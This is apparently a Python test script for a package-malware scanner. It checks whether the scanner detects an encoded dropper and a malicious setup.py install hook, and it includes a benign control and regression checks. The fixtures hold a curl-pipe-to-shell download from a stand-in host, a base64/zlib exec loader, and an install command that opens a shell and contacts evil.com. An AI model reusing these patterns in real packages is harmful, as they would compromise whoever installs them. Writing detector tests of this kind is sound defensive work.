"""Phase 4 Reality Verification Benchmark."""
from __future__ import annotations
import base64, io, json, os, sys, textwrap, time
sys.path.insert(0, os.path.dirname(__file__))

from malware_proof import _classify_decoded_payload, _try_decode_blob, scan_ast_deobfuscation, scan_static_setup_py, verify_release_integrity

_results = []
def _url_fn(f, ln): return f"test://{f}#L{ln}"
def _record(name, passed, detail=""):
    _results.append({"name": name, "passed": passed, "detail": detail})
    status = "PASS" if passed else "FAIL"
    print(f"  [{status}] {name}")
    if detail:
        for line in detail.strip().splitlines(): print(f"           {line}")

def test_attack1_multiline_dropper():
    malicious = 'import os, socket, subprocess; os.system("curl http://198.51.100.42/sh | sh")'
    import zlib
    encoded = base64.b64encode(zlib.compress(malicious.encode())).decode()
    mid = len(encoded) // 2
    part1, part2 = encoded[:mid], encoded[mid:]
    code = textwrap.dedent(f'''\
        import base64, zlib
        payload = ("{part1}""{part2}")
        exec(zlib.decompress(base64.b64decode(payload)).decode())
    ''')
    l1 = scan_ast_deobfuscation({"evil.py": code}, _url_fn)
    found = any(f.get("strong") for f in l1["findings"])
    _record("Attack 1: Multi-line double-encoded dropper", found, "Layer 1 DETECTED payload" if found else "Layer 1 MISSED")

def test_attack3_static_cmdclass():
    code = textwrap.dedent('''\
        import subprocess
        import urllib.request
        from setuptools import setup, Command
        class Evil(Command):
            def run(self):
                subprocess.Popen(["/bin/sh"])
                urllib.request.urlopen("http://evil.com")
        setup(cmdclass={'install': Evil})
    ''')
    l2 = scan_static_setup_py({"setup.py": code}, _url_fn)
    strong = any(f.get("strong") for f in l2["findings"])
    _record("Attack 3: Static cmdclass exec+net", strong, f"Found strong pattern: {strong}")

def test_benign2_legit_setup():
    code = textwrap.dedent('''\
        import subprocess
        from setuptools import setup
        version = subprocess.check_output(["git", "describe"]).decode().strip()
        setup(name="test", version=version)
    ''')
    l2 = scan_static_setup_py({"setup.py": code}, _url_fn)
    strong = any(f.get("strong") for f in l2["findings"])
    _record("Benign 2: Legitimate git describe", not strong, f"Flagged strong incorrectly" if strong else "Correctly ignored")

def test_regressions():
    from blast_radius import confirm_typosquat
    # 1. re.compile
    c1 = scan_ast_deobfuscation({"f.py": 'import re\nre.compile(r"(?:urllib|requests\.get|os\.environ)")'}, _url_fn)
    assert not c1["findings"]
    # 2. Typosquat table
    assert confirm_typosquat("reach", "PyPI") is None
    assert confirm_typosquat("reqeusts", "PyPI") == "requests"
    _record("Regressions: AST Whitelist & Typosquat Guard", True)

def main():
    print("=" * 72 + "\n  Phase 4 Reality Verification Benchmark\n" + "=" * 72)
    test_attack1_multiline_dropper()
    test_attack3_static_cmdclass()
    test_benign2_legit_setup()
    test_regressions()
    if any(not r["passed"] for r in _results): sys.exit(1)
    sys.exit(0)

if __name__ == "__main__": main()